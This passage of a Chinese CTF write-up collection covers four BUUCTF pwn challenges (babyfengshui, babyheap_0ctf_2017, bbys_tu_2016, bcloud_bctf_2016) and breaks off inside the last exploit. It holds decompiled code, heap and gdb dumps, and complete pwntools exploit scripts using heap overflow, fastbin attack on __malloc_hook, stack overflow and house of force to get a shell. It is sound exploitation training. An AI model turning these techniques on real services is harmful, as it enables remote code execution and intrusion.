    {
      puts(&quot;maximum capacity exceeded, bye&quot;);
      exit(0);
    }
  }
  exit(1);
}
</code></pre>
<p><strong>add_usr</strong></p>
<pre><code class="language-c">_DWORD *__cdecl add_usr(size_t a1)
{
  void *s; // ST24_4
  _DWORD *v2; // ST28_4

  s = malloc(a1);                               // 申请的description大小
  memset(s, 0, a1);
  v2 = malloc(0x80u);
  memset(v2, 0, 0x80u);                         // v2的大小为0x80
  *v2 = s;
  ptr[(unsigned __int8)byte_804B069] = v2;      // 将指针保存至指针数组中
  printf(&quot;name: &quot;);
  sub_80486BB((char *)ptr[(unsigned __int8)byte_804B069] + 4, 0x7C);// fgets 0x7个字符
  text_rewrite(++byte_804B069 - 1);             // 写入text
  return v2;
}                                               
</code></pre>
<blockquote>
<p>函数首先分配一个description的最大空间，让你后再分配给user结构体的空间，并将user放入store数组中，最后调用更新decription的函数</p>
</blockquote>
<pre><code class="language-c">struct user{
    char *desc;
    char name[0x7c];
}user;

struct user *store[];
</code></pre>
<blockquote>
<p>store放在0x804b080，当前user个数user_num放在0x804b069（byte_804B069）</p>
</blockquote>
<p><a href="https://blog.csdn.net/qinying001/article/details/104359401">https://blog.csdn.net/qinying001/article/details/104359401</a></p>
<p>可以从这篇文章看堆的情况，这里我大致画一下</p>
<pre><code class="language-python">#code
add_user(0x80, 0x80, 'AAAA')        # 0
add_user(0x80, 0x80, 'AAAA')        # 1  
add_user(0x8, 0x8, '/bin/sh\x00')   # 2
</code></pre>
<pre><code>=========================================
|| chunk0_desc 0x80 | chunk0_node 0x80 ||
=========================================
|| chunk1_desc 0x80 | chunk1_node 0x80 ||
=========================================
|| chunk2_desc 0x8  | chunk2_node 0x8  || 
=========================================
</code></pre>
<pre><code class="language-python">#code
delete_user(0)
</code></pre>
<pre><code>=========================================
|| 			freed_chunk 0x100		   ||
=========================================
|| chunk1_desc 0x80 | chunk1_node 0x80 ||
=========================================
|| chunk2_desc 0x8  | chunk2_node 0x8  || 
=========================================
</code></pre>
<pre><code class="language-python">#code
add_user(0x100, 0x19c, &quot;A&quot;*(0x100+0x80+0x8+0x10) + p32(elf.got['free']))    # 0 *desc-&gt;free_got
</code></pre>
<pre><code>=======================
|| chunk0_desc 0x100 || &lt;--first fit规则符合
=========================================
|| chunk1_desc 0x80  | chunk1_node 0x80 ||
=========================================
|| chunk2_desc 0x8   | chunk2_node 0x8  || 
=========================================
|| chunk0_node 0x80  || &lt;--被重新分配
=======================
</code></pre>
<blockquote>
<p>所以我们首先添加两个user，用于绕过检查。</p>
<p>第3个user存放&quot;/bin/sh&quot;。</p>
<p>然后删 掉第1个user，并创建一个description很长的user，其长度是第1个user的description长度加上user结构体长度。这时候检查就绕了，我们可以在添加新user的时候修改description大小，造成堆溢出，并修改第2个user的user&gt;desc为free@got.plt，从而泄漏出libc地址。</p>
<p>得到system地址后，此时修 改第2个user的description，其实是修free的GOT，所以我们将其改成，system@got.plt。</p>
<p>最后删除第3个user，触发system('/bin/sh')，得到shell</p>
<p>​				------《ctf_all_in_one》</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = 'debug'
io = process('./babyfengshui',env={'LD_PRELOAD':'./libc-2.23.so'})
#io = remote(&quot;node3.buuoj.cn&quot;,29784)
elf = ELF('babyfengshui')
libc = ELF('libc-2.23.so')
 
def add_user(size, length, text):
    io.sendlineafter(&quot;Action: &quot;, '0')
    io.sendlineafter(&quot;description: &quot;, str(size))
    io.sendlineafter(&quot;name: &quot;, 'AAAA')
    io.sendlineafter(&quot;length: &quot;, str(length))
    io.sendlineafter(&quot;text: &quot;, text)
 
def delete_user(idx):
    io.sendlineafter(&quot;Action: &quot;, '1')
    io.sendlineafter(&quot;index: &quot;, str(idx))
 
def display_user(idx):
    io.sendlineafter(&quot;Action: &quot;, '2')
    io.sendlineafter(&quot;index: &quot;, str(idx))
 
def update_desc(idx, length, text):
    io.sendlineafter(&quot;Action: &quot;, '3')
    io.sendlineafter(&quot;index: &quot;, str(idx))
    io.sendlineafter(&quot;length: &quot;, str(length))
    io.sendlineafter(&quot;text: &quot;, text)

def GDB():
	context.terminal = ['tmux','splitw','-h']
	gdb.attach(io)

if __name__ == &quot;__main__&quot;:
    add_user(0x80, 0x80, 'AAAA')        # 0
    add_user(0x80, 0x80, 'AAAA')        # 1
    add_user(0x8, 0x8, '/bin/sh\x00')   # 2
    delete_user(0)
    add_user(0x100, 0x19c, &quot;A&quot;*(0x100+0x80+0x8+0x10) + p32(elf.got['free']))    # 0
    display_user(1)
    io.recvuntil(&quot;description: &quot;)
    free_addr = u32(io.recvn(4))
    system_addr = free_addr - (libc.symbols['free'] - libc.symbols['system'])
    log.info(&quot;system address: 0x%x&quot; % system_addr)
 
    update_desc(1, 0x4, p32(system_addr))
    #desc-&gt;[free]&lt;-system
    delete_user(2)
 	#free(*desc)--&gt;system(&quot;/bin/sh\x00&quot;)
    io.interactive()
</code></pre>
<h2>babyheap_0ctf_2017</h2>
<h3>1.checksec</h3>
<pre><code>[*] '/home/joe1sn/Documents/ctf/questions/BUUCTF/pwn/babyheap_0ctf_2017/babyheap_0ctf_2017'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = sub_B70(a1, a2, a3);
  while ( 1 )
  {
    menu();
    input();                                    // input
    switch ( (unsigned __int64)off_14F4 )
    {
      case 1uLL:
        Allocate(v4);
        break;
      case 2uLL:
        Fill(v4);
        break;
      case 3uLL:
        Free(v4);
        break;
      case 4uLL:
        Dump(v4);
        break;
      case 5uLL:
        return 0LL;
      default:
        continue;
    }
  }
}
</code></pre>
<p><strong>Fill</strong></p>
<pre><code class="language-c">__int64 __fastcall Fill(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  printf(&quot;Index: &quot;);
  result = input();
  v2 = result;
  if ( (signed int)result &gt;= 0 &amp;&amp; (signed int)result &lt;= 15 )
  {
    result = *(unsigned int *)(24LL * (signed int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      printf(&quot;Size: &quot;);
      result = input();
      v3 = result;
      if ( (signed int)result &gt; 0 )
      {
        printf(&quot;Content: &quot;);
        result = sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3);
      }
    }
  }
  return result;
}
</code></pre>
<blockquote>
<p>没有检查堆是否溢出</p>
</blockquote>
<p><strong>Free</strong></p>
<pre><code class="language-c">__int64 __fastcall Free(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+1Ch] [rbp-4h]

  printf(&quot;Index: &quot;);
  result = input();
  v2 = result;
  if ( (signed int)result &gt;= 0 &amp;&amp; (signed int)result &lt;= 15 )
  {
    result = *(unsigned int *)(24LL * (signed int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      *(_DWORD *)(24LL * v2 + a1) = 0;
      *(_QWORD *)(24LL * v2 + a1 + 8) = 0LL;
      free(*(void **)(24LL * v2 + a1 + 16));
      result = 24LL * v2 + a1;
      *(_QWORD *)(result + 16) = 0LL;
    }
  }
  return result;
}
</code></pre>
<blockquote>
<p>没有system,leak libc + malloc_hook(无法修改GOT表)</p>
</blockquote>
<p><strong>one_gadget</strong></p>
<pre><code>0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
</code></pre>
<p><strong>main_arena_offset</strong></p>
<pre><code>[+]libc version : glibc 2.23
[+]build ID : BuildID[sha1]=1ca54a6e0d76188105b12e49fe6b8019bf08803a
[+]main_arena_offset : 0x3c4b20
</code></pre>
<h3>3.GDB</h3>
<h4>3.1 libc leak</h4>
<blockquote>
<p>一般采取堆块重叠后，free()加入unsorted bin最后dump出unsorted bin的地址，根据libc中与main_arena的偏移得到libc_base</p>
</blockquote>
<pre><code class="language-python">#code:
Allocate(0x60)
Allocate(0x30)
Fill(0,&quot;a&quot;*0x60+p64(0)+p64(0x71)) &lt;--修改idx=1的chunks size
Allocate(0x100)		#idx=2		  &lt;--堆重叠了
Fill(2,&quot;a&quot;*0x20+p64(0)+p64(0x71)) &lt;--idx=2的BK_nextsize位修改
Free(1)							  &lt;--加入fastbin链表（free()的还是0x30大小）
Allocate(0x60)#idx=1			  &lt;--堆溢出
Fill(1,&quot;a&quot;*0x30+p64(0)+p64(0x111))&lt;--堆修复
Allocate(0x60)#idx=3			  &lt;--和top_chunk分隔
Free(2)
GDB()
leak = u64(Dump(1)[-25:-17])
print &quot;leak:&quot;+hex(leak)

base=leak-0x3c4b78
malloc_hook=base+libc.sym['__malloc_hook']
print hex(malloc_hook)
</code></pre>
<pre><code>gef➤  heap chunks
Chunk(addr=0x55754fefb010, size=0x70, flags=PREV_INUSE)
    [0x000055754fefb010     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa]
Chunk(addr=0x55754fefb080, size=0x70, flags=PREV_INUSE)
    [0x000055754fefb080     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa]
Chunk(addr=0x55754fefb0f0, size=0x70, flags=PREV_INUSE)
    [0x000055754fefb0f0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
</code></pre>
<pre><code>───────────── Unsorted Bin for arena 'main_arena' ─────────────
[+] unsorted_bins[0]: fw=0x55754fefb0b0, bk=0x55754fefb0b0
 →   Chunk(addr=0x55754fefb0c0, size=0x110, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
</code></pre>
<pre><code>gef➤  x/45gx 0x55de8a864000
0x55de8a864000: 0x0000000000000000      0x0000000000000071
0x55de8a864010: 0x6161616161616161      0x6161616161616161
0x55de8a864020: 0x6161616161616161      0x6161616161616161
0x55de8a864030: 0x6161616161616161      0x6161616161616161
0x55de8a864040: 0x6161616161616161      0x6161616161616161
0x55de8a864050: 0x6161616161616161      0x6161616161616161
0x55de8a864060: 0x6161616161616161      0x6161616161616161
0x55de8a864070: 0x0000000000000000      0x0000000000000071
0x55de8a864080: 0x6161616161616161      0x6161616161616161
0x55de8a864090: 0x6161616161616161      0x6161616161616161
0x55de8a8640a0: 0x6161616161616161      0x6161616161616161
0x55de8a8640b0: 0x0000000000000000      0x0000000000000111
0x55de8a8640c0: 0x00007fa305c4ab78      0x00007fa305c4ab78  &lt;---unsorted bin
0x55de8a8640d0: 0x0000000000000000      0x0000000000000000
0x55de8a8640e0: 0x0000000000000000      0x0000000000000071
0x55de8a8640f0: 0x0000000000000000      0x0000000000000000
0x55de8a864100: 0x0000000000000000      0x0000000000000000
0x55de8a864110: 0x0000000000000000      0x0000000000000000
0x55de8a864120: 0x0000000000000000      0x0000000000000000
0x55de8a864130: 0x0000000000000000      0x0000000000000000
0x55de8a864140: 0x0000000000000000      0x0000000000000000
0x55de8a864150: 0x0000000000000000      0x0000000000000000
</code></pre>
<h4>3.2 fastbin attack</h4>
<blockquote>
<p>最后再修改malloc_hook-35的地址（mallco_hook的参数要偏移，且偏移后的地址不能为0）为exec_binsh(one_gadget)</p>
<p>简言之就是hook-&gt;onegadget</p>
</blockquote>
<pre><code class="language-python">#code:
Free(1)
Fill(0,&quot;a&quot;*0x60+p64(0)+p64(0x71)+p64(malloc_hook-35)+p64(0))
GDB()
#堆溢出覆盖chunk1的fd,使得下一块chunk在malloc_hook-35的地方
Allocate(0x60)
GDB()
</code></pre>
<h4>3.4 覆盖chunk1的fd</h4>
<p><strong>heap</strong></p>
<pre><code>0x55a4b068b000 FASTBIN {  &lt;---chunk 0
  prev_size = 0, 
  size = 113, 
  fd = 0x6161616161616161, 
  bk = 0x6161616161616161, 
  fd_nextsize = 0x6161616161616161, 
  bk_nextsize = 0x6161616161616161
}
0x55a4b068b070 FASTBIN {   &lt;---chunk1
  prev_size = 0, 
  size = 113, 
  fd = 0x7f038a23caed &lt;_IO_wide_data_0+301&gt;, 
  		malloc_hook-35
  bk = 0x0, 
  fd_nextsize = 0x6161616161616161, 
  bk_nextsize = 0x6161616161616161
}
0x55a4b068b0e0 FASTBIN {
  prev_size = 0, 
  size = 113, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x55a4b068b150 {
  prev_size = 0, 
  size = 0, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
</code></pre>
<p><strong>bins</strong></p>
<pre><code>fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x7ff5da1deaed (_IO_wide_data_0+301) ◂— 0xf5d9e9fe20000000
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
</code></pre>
<p><strong>stack</strong></p>
<pre><code>pwndbg&gt; x/gx 0x7ff5da1deb10-35 
0x7ff5da1deaed &lt;_IO_wide_data_0+301&gt;:   0xf5da1dd260000000 
0x7ff5da1deaf5 &lt;_IO_wide_data_0+309&gt;:   0x000000000000007f 
0x7ff5da1deafd: 0xf5d9e9fe20000000 
0x7ff5da1deb05 &lt;__memalign_hook+5&gt;:     0xf5d9e9fa0000007f 
0x7ff5da1deb0d &lt;__realloc_hook+5&gt;:      0x000000000000007f 
0x7ff5da1deb15 &lt;__malloc_hook+5&gt;:       0x0000000000000000 
0x7ff5da1deb1d: 0x0000000000000000 
0x7ff5da1deb25 &lt;main_arena+5&gt;:  0x0000000000000000
</code></pre>
<h4>3.5 填入onegadget</h4>
<p><strong>heap</strong></p>
<pre><code>0x55efd712d000 FASTBIN {
  prev_size = 0, 
  size = 113, 
  fd = 0x6161616161616161, 
  bk = 0x6161616161616161, 
  fd_nextsize = 0x6161616161616161, 
  bk_nextsize = 0x6161616161616161
}
0x55efd712d070 FASTBIN {
  prev_size = 0, 
  size = 113, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x55efd712d0e0 FASTBIN {
  prev_size = 0, 
  size = 113, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x55efd712d150 {
  prev_size = 0, 
  size = 0, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
</code></pre>
<p><strong>gdb</strong></p>
<pre><code>pwndbg&gt; x/gx 0x7f0f7c16ab10-35
0x7f0f7c16aaed &lt;_IO_wide_data_0+301&gt;:   0x0f7c169260000000 
0x7f0f7c16aaf5 &lt;_IO_wide_data_0+309&gt;:   0x000000000000007f
0x7f0f7c16aafd: 0x4141414141414141
0x7f0f7c16ab05 &lt;__memalign_hook+5&gt;:     0x4141414141414141
0x7f0f7c16ab0d &lt;__realloc_hook+5&gt;:      0x0f7bdeb26a414141
0x7f0f7c16ab15 &lt;__malloc_hook+5&gt;:       0x000000000000007f
</code></pre>
<pre><code>0x7f0f7bda6000+0x4526a=0x7f0f7bdeb26a
		=0x7f0f7c16ab0d &lt;__realloc_hook+5&gt;的数值
</code></pre>
<h3>4.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = 'debug'
#p = remote(&quot;node3.buuoj.cn&quot;,26611)
libc = ELF(&quot;./libc-2.23.so&quot;)
p = process(&quot;./babyheap_0ctf_2017&quot;)

def Allocate(size):
	p.sendlineafter(&quot;Command: &quot;,&quot;1&quot;)
	p.sendlineafter(&quot;Size: &quot;,str(size))

def Fill(idx,content):
	p.sendlineafter(&quot;Command: &quot;,&quot;2&quot;)
	p.sendlineafter(&quot;Index: &quot;,str(idx))
	p.sendlineafter(&quot;Size: &quot;,str(len(content)))
	p.sendlineafter(&quot;Content: &quot;,content)

def Free(idx):
	p.sendlineafter(&quot;Command: &quot;,&quot;3&quot;)
	p.sendlineafter(&quot;Index: &quot;,str(idx))

def Dump(idx):
    p.recvuntil(&quot;Command:&quot;)
    p.sendline(&quot;4&quot;)
    p.recvuntil(&quot;Index:&quot;)
    p.sendline(str(idx))
    p.recvuntil('Content: \n')
    return p.recvline()

def GDB():
    context.terminal = ['tmux','splitw','-h']
    gdb.attach(p)

Allocate(0x60)
Allocate(0x30)
Fill(0,&quot;a&quot;*0x60+p64(0)+p64(0x71))
Allocate(0x100)
Fill(2,&quot;a&quot;*0x20+p64(0)+p64(0x71))
Free(1)
Allocate(0x60)
Fill(1,&quot;a&quot;*0x30+p64(0)+p64(0x111))
Allocate(0x60)
Free(2)
print Dump(1)
leak = u64(Dump(1)[-25:-17])
print &quot;leak:&quot;+hex(leak)

base=leak-0x3c4b78
malloc_hook=base+libc.sym['__malloc_hook']
print hex(malloc_hook)
Free(1)
Fill(0,&quot;a&quot;*0x60+p64(0)+p64(0x71)+p64(malloc_hook-35)+p64(0))
Allocate(0x60)
Allocate(0x60)
Fill(2,&quot;A&quot;*(35-8-8)+p64(base+0x4526a))
Allocate(0x10)
p.interactive()
</code></pre>
<h2>bbys_tu_2016</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+14h] [ebp-Ch]

  puts(&quot;This program is hungry. You should feed it.&quot;);
  __isoc99_scanf(&quot;%s&quot;, &amp;v4);
  puts(&quot;Do you feel the flow?&quot;);
  return 0;
}
</code></pre>
<p><strong>printFlag</strong></p>
<pre><code class="language-c">int printFlag()
{
  char s; // [esp+1Ah] [ebp-3Eh]
  FILE *stream; // [esp+4Ch] [ebp-Ch]

  stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
  fgets(&amp;s, 50, stream);
  puts(&amp;s);
  fflush(stdout);
  return fclose(stream);
}
</code></pre>
<blockquote>
<p>简单栈溢出</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
p = remote(&quot;node3.buuoj.cn&quot;,28634)
elf = ELF(&quot;./bbys_tu_2016&quot;)
print_flag=elf.sym[&quot;printFlag&quot;]

payload = 'a'*(0xc+8+4)+p32(print_flag)
p.sendline(payload)
print p.recv()
p.interactive()
</code></pre>
<h2>bcloud_bctf_2016</h2>
<h3>1.checksec</h3>
<pre><code class="language-python">    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>sub_80487A1</strong></p>
<pre><code class="language-c">unsigned int sub_80487A1()
{
  char s; // [esp+1Ch] [ebp-5Ch]
  char *v2; // [esp+5Ch] [ebp-1Ch]
  unsigned int v3; // [esp+6Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  memset(&amp;s, 0, 0x50u);
  puts(&quot;Input your name:&quot;);
  safe_read((int)&amp;s, 0x40, 10);
  v2 = (char *)malloc(0x40u);
  dword_804B0CC = (int)v2;
  strcpy(v2, &amp;s);
  start_line((int)v2);
  return __readgsdword(0x14u) ^ v3;
}
</code></pre>
<blockquote>
<p><strong>s</strong>的最大为<strong>0x40</strong>，<strong>v2</strong>最大也为<strong>0x40</strong></p>
</blockquote>
<p><strong>sub_8048779</strong></p>
<pre><code class="language-c">int __cdecl sub_8048779(int a1)
{
  printf(&quot;Hey %s! Welcome to BCTF CLOUD NOTE MANAGE SYSTEM!\n&quot;, a1);
  return puts(&quot;Now let's set synchronization options.&quot;);
}
</code></pre>
<blockquote>
<p>这里就可以泄露 <strong>v2</strong> 指针的地址</p>
</blockquote>
<p><strong>sub_804884E</strong></p>
<pre><code class="language-c">unsigned int sub_804884E()
{
  char s; // [esp+1Ch] [ebp-9Ch]
  char *v2; // [esp+5Ch] [ebp-5Ch]
  int v3; // [esp+60h] [ebp-58h]
  char *v4; // [esp+A4h] [ebp-14h]
  unsigned int v5; // [esp+ACh] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  memset(&amp;s, 0, 0x90u);
  puts(&quot;Org:&quot;);
  safe_read((int)&amp;s, 0x40, '\n');
  puts(&quot;Host:&quot;);
  safe_read((int)&amp;v3, 0x40, '\n');
  v4 = (char *)malloc(0x40u);
  v2 = (char *)malloc(0x40u);
  dword_804B0C8 = (int)v2;
  dword_804B148 = (int)v4;
  strcpy(v4, (const char *)&amp;v3);
  strcpy(v2, &amp;s);
  puts(&quot;OKay! Enjoy:)&quot;);
  return __readgsdword(0x14u) ^ v5;
}
</code></pre>
<blockquote>
<p>因为这里是32位程序，而且 <strong>s</strong> 和 <strong>v2</strong> 的栈空间相差64，刚好可以覆盖 <strong>v2</strong> 的低地。然后到这一步的话， <strong>top chunk</strong> 又刚好在 <strong>v2</strong> 的下方，<code>strcpy(v2, &amp;s);</code>将<strong>0x40</strong>个字符 + <strong>v2</strong> 地址 + <strong>v3</strong> 内容一同复制进v2可以通过溢出覆盖 <strong>top chunk</strong> 的 <strong>size</strong>域，符合了 <strong>HOF</strong> 的第一个条件 <code>能够以溢出等方式控制到 top chunk 的 size 域</code></p>
</blockquote>
<pre><code class="language-c">+-------------+----+--------------------------------+
| 0000009C s  | s  | safe_read((int)&amp;s, 0x40, '\n');|
+---------------------------------------------------+
| 0000005C    | v2 | v2 = (char *)malloc(0x40u);    |
+---------------------------------------------------+
| 00000058    | v3 |safe_read((int)&amp;v3, 0x40, '\n');|
+---------------------------------------------------+    
strcpy(v2, &amp;s);
</code></pre>
<h3>3.思路</h3>
<blockquote>
<ol>
<li>利用初始化名字处的漏洞泄漏堆的基地址。。</li>
<li>利用 <strong>house of force</strong> 将 <strong>top chunk</strong> 分配至全局的 <strong>0x0804B0A0</strong> 的 <strong>&amp;notesize-8</strong> 处，当再次申请内存时，便返回<strong>notesize</strong>地址处的内存，从而我们就可以控制所有<strong>note</strong>的大小以及对应的地址了。</li>
<li>修改前三个 note 的大小为16，并修改其指针为 <strong>free@got</strong>，<strong>notesize</strong>，<strong>libc_start</strong></li>
<li>将 <strong>free@got</strong> 修改为 <strong>puts@plt</strong>。</li>
<li>泄漏 <strong>libc_start</strong> 地址。</li>
<li>再次修改另外一个 <strong>free@got</strong> 项为 <strong>system</strong> 地址，从而拿到shell。</li>
</ol>
</blockquote>
<h3>4.gdb</h3>
<h4>0x1 leak_addr</h4>
<pre><code>0x804c000:	0x0000004900000000	0x6161616161616161
0x804c010:	0x6161616161616161	0x6161616161616161
0x804c020:	0x6161616161616161	0x6161616161616161
0x804c030:	0x6161616161616161	0x6161616161616161
0x804c040:	0x6161616161616161	0x00020f000804c008
</code></pre>
<blockquote>
<p><code>0x00020f000804c008</code>发现距离地址相差 <strong>8</strong>，所以之后要去减去</p>
</blockquote>
<pre><code class="language-python">#code:
    sh.sendafter(&quot;Input your name:\n&quot;,'a'*0x40)
    sh.recvuntil('a'*0x40)
    leak = u32(sh.recv(4)) - 8
    log.success(&quot;leak addr &gt; 0x%x&quot;,leak)
    gdb.attach(sh)
#gdb
0x9e89000:	0x0000004900000000	0x6161616161616161
0x9e89010:	0x6161616161616161	0x6161616161616161
0x9e89020:	0x6161616161616161	0x6161616161616161
0x9e89030:	0x6161616161616161	0x6161616161616161
0x9e89040:	0x6161616161616161	0x00020f0009e89008
0x9e89050:	0x0000000000000000	0x0000000000000000
#gef
gef➤  heap chunks
Chunk(addr=0x9e89008, size=0x48, flags=PREV_INUSE)
··········································
Chunk(addr=0x9e89050, size=0x48, flags=PREV_INUSE)
··········································
Chunk(addr=0x9e89098, size=0x48, flags=PREV_INUSE)
··········································
Chunk(addr=0x9e890e0, size=0x20e70, flags=PREV_INUSE)  ←  top chunk
··········································
#计算
&gt;&gt;&gt;hex(0x9e890e0 - 0x9e89008)
0xd8		#得到top_chunk相对偏移
</code></pre>
<h4>0x2 hof</h4>
<pre><code class="language-python">#code:
	sh.sendafter(&quot;Org:\n&quot;,'a'*64)
	sh.sendlineafter(&quot;Host:\n&quot;,p32(0xffffffff))
	log.success(&quot;top chunk &gt; 0x%x&quot;,top_chunk)
#gdb
0x9e89008:	0x6161616161616161	0x6161616161616161
0x9e89018:	0x6161616161616161	0x6161616161616161
0x9e89028:	0x6161616161616161	0x6161616161616161
0x9e89038:	0x6161616161616161	0x6161616161616161
0x9e89048:	0x0000004909e89008	0x00000000ffffffff
0x9e89058:	0x0000000000000000	0x0000000000000000
0x9e89068:	0x0000000000000000	0x0000000000000000
0x9e89078:	0x0000000000000000	0x0000000000000000
0x9e89088:	0x0000000000000000	0x0000004900000000
0x9e89098:	0x6161616161616161	0x6161616161616161
0x9e890a8:	0x6161616161616161	0x6161616161616161
0x9e890b8:	0x6161616161616161	0x6161616161616161
0x9e890c8:	0x6161616161616161	0x6161616161616161
0x9e890d8:	0xffffffff09e89098	0x0000000000000000
0x9e890e8:	0x0000000000000000	0x0000000000000000
0x9e890f8:	0x0000000000000000	0x0000000000000000
#gef
gef➤  heap chunks
Chunk(addr=0x9e89008, size=0x48, flags=PREV_INUSE)
Chunk(addr=0x9e89050, size=0x48, flags=PREV_INUSE)
Chunk(addr=0x9e89098, size=0x48, flags=PREV_INUSE)
Chunk(addr=0x9e890e0, size=0xfffffff8, flags=PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)  ←  top chunk

</code></pre>
<blockquote>
<p><strong>top chunk</strong> 的 <strong>size</strong>域被改变了</p>
</blockquote>
<h4>0x3 迁移top chunk</h4>
<pre><code class="language-python">#code:
	notesize_addr = 0x0804B0A0
	notelist_addr = 0x0804B120
	target = notesize_addr - 8
	offset  = target - top_chunk - 8
	log.success(&quot;offset &gt; &quot;+hex(offset))
	add(offset,&quot;aaaa&quot;)
#terminal
[+] 1st chunk addr &gt; 0x9f8c000
[+] top chunk &gt; 0x9f8c0d8
[+] offset &gt; -0x1f41048
#pwndbg
0x804b098 PREV_INUSE {
  prev_size = 0, 
  size = 32772153, 
  fd = 0xfe0befb8, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
</code></pre>
<blockquote>
<p>发现多了这个 <strong>chunk</strong> ，地址=<strong>notesize_addr - 8</strong>
说明迁移成功，那么下一次就会分配chunk到这里来</p>
</blockquote>
<h4>0x4 <strong>free@got</strong>泄露</h4>
<pre><code class="language-python">#code:
	payload = p32(16) * 3 
	payload += (notelist_addr - notesize_addr - 12) * 'a' 
	payload += p32(elf.got['free']) + p32(elf.got['atoi']) * 2
	add(1000,payload)
#pwndbg
0x804b098:	0x00000000	0x01f41039	0xfe0befb8	0x00000000
0x804b0a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b0b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b0c8:	0x09f8c098	0x09f8c008	0x00000000	0x00000000
</code></pre>
<h3>5.EXP</h3>
<pre><code class="language-python">from pwn import *
#context.log_level = &quot;debug&quot;
context.arch = &quot;i386&quot;
elf = ELF(&quot;./bcloud_bctf_2016&quot;)
libc = ELF(&quot;/home/joe1sn/libc/32/libc-2.23.so&quot;)
sh = remote(&quot;node3.buuoj.cn&quot;,29429)

def add(size,text):
	sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;)
	sh.sendlineafter(&quot;:&quot;,str(size))
	if size &gt; 0:
		sh.recvuntil(&quot;:&quot;)
		sh.send(text)

def edit(idx,text):
	sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;3&quot;)
	sh.sendlineafter(&quot;:&quot;,str(idx))
	sh.sendafter(&quot;:&quot;,text)

def delete(idx):
	sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;4&quot;)
	sh.sendlineafter(&quot;:&quot;,str(idx))

if __name__ == '__main__':

#------------------leak------------------
	sh.sendafter(&quot;:&quot;,&quot;b&quot; * 0x40)
	sh.recvuntil(&quot;b&quot; * 0x40)
	heap_base = u32(sh.recv(4)) - 8
	top_chunk = heap_base + 0xd8
	log.success(&quot;1st chunk &gt; &quot;+hex(heap_base))
	log.success(&quot;top chunk &gt; &quot;+hex(top_chunk))

#------------------hof------------------
	sh.recvuntil(&quot;:&quot;)
	sh.send(0x40 * &quot;a&quot;)
	sh.recvuntil(&quot;:&quot;)
	sh.sendline(&quot;\xff&quot; * 0x4)

#------------------top chunk------------------
	notesize_addr = 0x0804B0A0
	notelist_addr = 0x0804B120
	offset = notesize_addr - top_chunk - 0x10
	add(offset,'')

#------free@got,atoi@got,atoi@got------
	payload = p32(0x400) * 10
	payload = payload.ljust(0x0804B120 - 0x0804B0A0,'\x00')
	payload += p32(elf.got['free'])
	payload += p32(notesize_addr)
	payload += p32(elf.got['__libc_start_main'])
	add(0x400,payload + &quot;\n&quot;)
	edit(0,p32(elf.plt['puts']) + &quot;\n&quot;)
	delete(2)
#------------------leak all------------------
	__libc_start_main = u32(sh.recvuntil('\xf7')[-4:])
	base = __libc_start_main - libc.symbols['__libc_start_main']
	system = base + libc.symbols['system']
	binsh = base + libc.search(&quot;/bin/sh\x00&quot;).next()
	log.success('libc base addr: ' + hex(base))
	log.success('system addr: ' + hex(system))
	log.success('/bin/sh addr: ' + hex(binsh))

#------------------attack------------------
